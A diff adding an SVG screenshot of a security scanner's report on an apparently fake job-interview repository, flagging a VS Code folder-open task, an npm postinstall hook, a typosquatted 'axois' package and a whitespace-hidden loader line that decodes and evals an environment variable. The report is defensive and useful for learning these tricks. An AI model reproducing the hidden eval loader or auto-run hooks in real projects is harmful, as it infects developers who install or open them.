@@ -1,0 +1,46 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="959" height="562" viewBox="0 0 959 562" font-family="JetBrains Mono, Fira Code, DejaVu Sans Mono, Menlo, Consolas, monospace" font-size="14">
+<rect width="959" height="562" rx="6" fill="#071018"/>
+<rect x="0.5" y="0.5" width="958" height="561" rx="6" fill="none" stroke="#22d3ee" stroke-opacity="0.35"/>
+<path d="M4,18 V4 H18" fill="none" stroke="#22d3ee" stroke-width="2"/>
+<path d="M955,18 V4 H941" fill="none" stroke="#22d3ee" stroke-width="2"/>
+<path d="M4,544 V558 H18" fill="none" stroke="#22d3ee" stroke-width="2"/>
+<path d="M955,544 V558 H941" fill="none" stroke="#22d3ee" stroke-width="2"/>
+<line x1="22" y1="32" x2="937" y2="32" stroke="#22d3ee" stroke-opacity="0.25"/>
+<text x="22" y="22" fill="#22d3ee" font-size="12">$ git clone https://github.com/recruiter-xyz/job-task</text>
+<text x="22.0" y="52" fill="#22d3ee" font-weight="bold" textLength="235.2" lengthAdjust="spacingAndGlyphs">[ guardpost scan: job-task ]</text>
+<text x="274.0" y="52" fill="#6b7f8e" textLength="117.6" lengthAdjust="spacingAndGlyphs">3 files, 0.8 s</text>
+<text x="22.0" y="71" fill="#22d3ee" textLength="394.8" lengthAdjust="spacingAndGlyphs">-- Runs automatically when you install or build</text>
+<text x="47.2" y="90" fill="#d7e3ea" textLength="470.4" lengthAdjust="spacingAndGlyphs">npm install: runs &quot;postinstall&quot;: node tailwind.config.js</text>
+<text x="22.0" y="109" fill="#22d3ee" textLength="92.4" lengthAdjust="spacingAndGlyphs">-- Findings</text>
+<text x="30.4" y="128" fill="#ff5c6c" font-weight="bold" textLength="33.6" lengthAdjust="spacingAndGlyphs">HIGH</text>
+<text x="80.8" y="128" fill="#d7e3ea" font-weight="bold" textLength="470.4" lengthAdjust="spacingAndGlyphs">Runs a command as soon as you open the folder in VS Code</text>
+<text x="89.2" y="147" fill="#d7e3ea" textLength="151.2" lengthAdjust="spacingAndGlyphs">.vscode/tasks.json</text>
+<text x="89.2" y="166" fill="#6b7f8e" textLength="319.2" lengthAdjust="spacingAndGlyphs">&gt; &quot;command&quot;: &quot;node tailwind.config.js&quot;</text>
+<text x="89.2" y="185" fill="#d7e3ea" textLength="798.0" lengthAdjust="spacingAndGlyphs">A .vscode/tasks.json task set to runOn: folderOpen. This is how fake job-interview repos infect</text>
+<text x="895.6" y="185" fill="#d7e3ea" textLength="8.4" lengthAdjust="spacingAndGlyphs">…</text>
+<text x="30.4" y="204" fill="#ff5c6c" font-weight="bold" textLength="33.6" lengthAdjust="spacingAndGlyphs">HIGH</text>
+<text x="80.8" y="204" fill="#d7e3ea" font-weight="bold" textLength="386.4" lengthAdjust="spacingAndGlyphs">npm &#x27;postinstall&#x27; runs a file that was flagged</text>
+<text x="89.2" y="223" fill="#d7e3ea" textLength="100.8" lengthAdjust="spacingAndGlyphs">package.json</text>
+<text x="89.2" y="242" fill="#6b7f8e" textLength="210.0" lengthAdjust="spacingAndGlyphs">&gt; node tailwind.config.js</text>
+<text x="89.2" y="261" fill="#d7e3ea" textLength="781.2" lengthAdjust="spacingAndGlyphs">tailwind.config.js runs on npm install and has: Code hidden off the right edge of the screen.</text>
+<text x="30.4" y="280" fill="#ff5c6c" font-weight="bold" textLength="33.6" lengthAdjust="spacingAndGlyphs">HIGH</text>
+<text x="80.8" y="280" fill="#d7e3ea" font-weight="bold" textLength="369.6" lengthAdjust="spacingAndGlyphs">Code hidden off the right edge of the screen</text>
+<text x="89.2" y="299" fill="#d7e3ea" textLength="168.0" lengthAdjust="spacingAndGlyphs">tailwind.config.js:1</text>
+<text x="89.2" y="318" fill="#6b7f8e" textLength="268.8" lengthAdjust="spacingAndGlyphs">&gt; eval(atob(process.env.K||&#x27;&#x27;));</text>
+<text x="89.2" y="337" fill="#d7e3ea" textLength="806.4" lengthAdjust="spacingAndGlyphs">Hundreds of spaces push this code out of view in editors and on GitHub. Fake &#x27;interview task&#x27; re</text>
+<text x="895.6" y="337" fill="#d7e3ea" textLength="8.4" lengthAdjust="spacingAndGlyphs">…</text>
+<text x="30.4" y="356" fill="#ff5c6c" font-weight="bold" textLength="33.6" lengthAdjust="spacingAndGlyphs">HIGH</text>
+<text x="80.8" y="356" fill="#d7e3ea" font-weight="bold" textLength="218.4" lengthAdjust="spacingAndGlyphs">Runs hidden (decoded) code</text>
+<text x="89.2" y="375" fill="#d7e3ea" textLength="168.0" lengthAdjust="spacingAndGlyphs">tailwind.config.js:1</text>
+<text x="89.2" y="394" fill="#6b7f8e" textLength="302.4" lengthAdjust="spacingAndGlyphs">&gt; ... eval(atob(process.env.K||&#x27;&#x27;));</text>
+<text x="89.2" y="413" fill="#d7e3ea" textLength="630.0" lengthAdjust="spacingAndGlyphs">Decodes a blob and executes it, so the real code can&#x27;t be read in the repo.</text>
+<text x="30.4" y="432" fill="#facc15" textLength="33.6" lengthAdjust="spacingAndGlyphs">WARN</text>
+<text x="80.8" y="432" fill="#d7e3ea" font-weight="bold" textLength="193.2" lengthAdjust="spacingAndGlyphs">Look-alike package name</text>
+<text x="89.2" y="451" fill="#d7e3ea" textLength="100.8" lengthAdjust="spacingAndGlyphs">package.json</text>
+<text x="89.2" y="470" fill="#6b7f8e" textLength="151.2" lengthAdjust="spacingAndGlyphs">&gt; &quot;axois&quot;: &quot;1.6.0&quot;</text>
+<text x="89.2" y="489" fill="#d7e3ea" textLength="798.0" lengthAdjust="spacingAndGlyphs">&#x27;axois&#x27; is one letter away from the popular &#x27;axios&#x27;. Typosquatted packages steal data. This one</text>
+<text x="895.6" y="489" fill="#d7e3ea" textLength="8.4" lengthAdjust="spacingAndGlyphs">…</text>
+<text x="22.0" y="527" fill="#d7e3ea" textLength="722.4" lengthAdjust="spacingAndGlyphs">DANGER: don&#x27;t install, build or open this in VS Code until you&#x27;ve read the HIGH items.</text>
+<text x="761.2" y="527" fill="#6b7f8e" textLength="168.0" lengthAdjust="spacingAndGlyphs">(4 high, 1 warn, 0 n</text>
+<text x="929.2" y="527" fill="#d7e3ea" textLength="8.4" lengthAdjust="spacingAndGlyphs">…</text>
+</svg>
